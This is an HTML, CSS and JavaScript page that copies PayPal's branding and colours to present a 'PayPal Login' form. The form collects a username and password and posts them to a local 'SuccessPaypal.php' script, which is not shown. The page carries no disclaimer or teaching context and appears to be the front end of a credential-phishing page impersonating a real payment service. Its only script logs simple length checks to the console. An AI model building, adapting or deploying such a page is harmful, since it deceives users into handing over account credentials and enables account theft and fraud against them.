<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title class="title">PayPal Login Form</title>

    <style>
        /* Resetting some default styles */
        body, h2, form {
            margin: 0;
            padding: 0;
        }

        /* Submit button styles */
        .submit-btn a {
            width: 100%;
            padding: 12px;
            background-color: #009cde; /* PayPal primary blue color */
            color: white;
            font-size: 16px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            text-decoration: none;
            text-align: center;
        }

        .submit-btn a:hover {
            background-color: #007bb5; /* Darker blue for hover effect */
        }

        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #009cde, #006ab6); /* PayPal gradient blue background */
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .payment-form {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 350px;
            box-sizing: border-box;
        }

        .payment-form h2 {
            text-align: center;
            margin-bottom: 20px;
            color: #333;
            font-size: 24px;
        }

        .input-group {
            margin-bottom: 15px;
        }

        .input-group label {
            font-size: 14px;
            color: #333;
            display: block;
            margin-bottom: 5px;
        }

        .input-group input {
            width: 100%;
            padding: 10px;
            font-size: 14px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }

        .input-group input:focus {
            border-color: #009cde;
            outline: none;
        }

        /* PayPal Logo */
        .card-logo {
            text-align: center;
            margin: 10px 0;
        }

        .card-logo img {
            width: 120px; /* PayPal logo size */
        }

        /* Submit button */
        .submit-btn {
            width: 100%;
            padding: 12px;
            background-color: #009cde;
            color: white;
            font-size: 16px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }

        .submit-btn:hover {
            background-color: #007bb5;
        }

        .error-message {
            color: red;
            font-size: 12px;
            display: none;
        }
    </style>
</head>
<body>

<div class="payment-form">
    <h2>PayPal Login</h2>
    <form action="SuccessPaypal.php" method="POST" id="loginForm">
        
        <!-- Username -->
        <div class="input-group">
            <label for="username">Username</label>
            <input type="text" id="username" name="username" placeholder="Enter your username" required>
            <span class="error-message" id="usernameError">Please enter a valid username.</span>
        </div>

        <!-- Password -->
        <div class="input-group">
            <label for="password">Password</label>
            <input type="password" id="password" name="password" placeholder="Enter your password" required>
            <span class="error-message" id="passwordError">Please enter a valid password.</span>
        </div>

        <!-- Submit Button -->
        <input type="submit" class="submit-btn" id="submit-btn"><a href="successPaypal.php"></a></input>
    </form>
</div>

<script>
document.getElementById("submit-btn").addEventListener("click", e => {
    const username = document.getElementById("username").value;
    try {
        if (username && username.length >= 3) {
            console.log("Success: Valid username.");
        } else {
            console.log("Error: Invalid username. Ensure it's at least 3 characters.");
        }
    } catch (e) {
        console.error("An error occurred: ", e);
    }

    const password = document.getElementById("password").value;
    try {
        if (password && password.length >= 6) {
            console.log("Success: Valid password.");
        } else {
            console.log("Error: Invalid password. Ensure it's at least 6 characters.");
        }
    } catch (e) {
        console.error("An error occurred: ", e);
    }
});
</script>

</body>
</html>
